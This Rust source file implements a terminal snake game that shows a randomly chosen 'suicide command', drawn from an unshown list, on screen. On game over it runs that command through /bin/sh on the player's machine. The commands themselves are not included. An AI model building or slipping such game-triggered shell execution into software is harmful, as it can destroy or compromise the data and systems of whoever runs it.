mod commands;
mod gameutils;
mod intro;

use std::{ process, time, thread };
use crossterm::{ execute, Result, terminal, cursor, style };

use commands::{ prepare_suicide_commands_list, random_command };
use gameutils::{ Direction, read_events, random_point };
use intro::print_intro;

fn main() -> Result<()> {
    let commands = prepare_suicide_commands_list()?;

    let size = crossterm::terminal::size()?;
    crossterm::terminal::enable_raw_mode()?;

    let mut rng = rand::thread_rng();
    let mut stdout = std::io::stdout();

    let mut snake = vec![random_point(&size, &mut rng)];
    let mut direction = Direction::Up;

    let mut apple = random_point(&size, &mut rng);
    let mut command = random_command(&mut rng, &commands, 1);

    print_intro(&mut stdout)?;

    'game: loop {
        // Read all available events
        for event in read_events().iter() {
            match event {
                crossterm::event::Event::Key(key_event) => {
                    // And finally we check if it's a KeyEvent
                    let crossterm::event::KeyEvent { code, .. } = key_event;

                    match code {
                        crossterm::event::KeyCode::Up => {
                            direction = Direction::Up;
                        },
                        crossterm::event::KeyCode::Down => {
                            direction = Direction::Down;
                        },
                        crossterm::event::KeyCode::Right => {
                            direction = Direction::Right;
                        },
                        crossterm::event::KeyCode::Left => {
                            direction = Direction::Left;
                        },
                        _ => (),
                    };
                },
                _ => ()
            };
        }

        // We take first_item and clone it
        let first_item = snake[0];

        if let Some(mut last_item) = snake.pop() {
            match direction {
                Direction::Up => {
                    last_item.x = first_item.x;
                    last_item.y = first_item.y - 1;
                },
                Direction::Down => {
                    last_item.x = first_item.x;
                    last_item.y = first_item.y + 1;
                },
                Direction::Left => {
                    last_item.x = first_item.x - 1;
                    last_item.y = first_item.y;
                },
                Direction::Right => {
                    last_item.x = first_item.x + 1;
                    last_item.y = first_item.y;
                },
            };

            snake.insert(0, last_item);
        }

        // Now the snake has changed to it's another first item
        // We take it and check snake for colliding with itself
        let first_item = snake[0];

        for element in snake[1..].iter() {
            if element.x == first_item.x && element.y == first_item.y {
                break 'game;
            }
        }

        // Now we perform additional checks for game boundaries

        for element in snake.iter() {
            if element.x < 0 || element.y < 0 || element.x > 1 + size.0 as i32 || element.y > 1 + size.1 as i32 {
                break 'game;
            }
        }

        // Check for apple eating

        if first_item.x == apple.x && first_item.y == apple.y {
            apple = random_point(&size, &mut rng);

            snake.push(first_item);
            command = random_command(&mut rng, &commands, snake.len() as u16);
        }

        //
        // Render
        //

        execute!(
            stdout,
            terminal::Clear(terminal::ClearType::All),
        )?;

        execute!(
            stdout,
            cursor::MoveTo((size.0 / 2) as u16 - (&command.len() / 2) as u16, (size.1 / 2) as u16),
            style::SetForegroundColor(style::Color::White),
            style::Print(&command)
        )?;

        for (index, element) in snake.iter().enumerate() {
            execute!(
                stdout,
                cursor::MoveTo(element.x as u16, element.y as u16),
                style::SetForegroundColor(style::Color::Blue),
                style::Print(if index == 0 { "█" } else { "▅" })
            )?;
        }

        execute!(
            stdout,
            cursor::MoveTo(apple.x as u16, apple.y as u16),
            style::SetForegroundColor(style::Color::Red),
            style::Print("▇")
        )?;

        thread::sleep(time::Duration::from_millis(1000 / 10));
    }

    // Game has finished

    process::Command::new("/bin/sh").args(&["-c", &command[0..]]).spawn()?;

    Ok(())
}
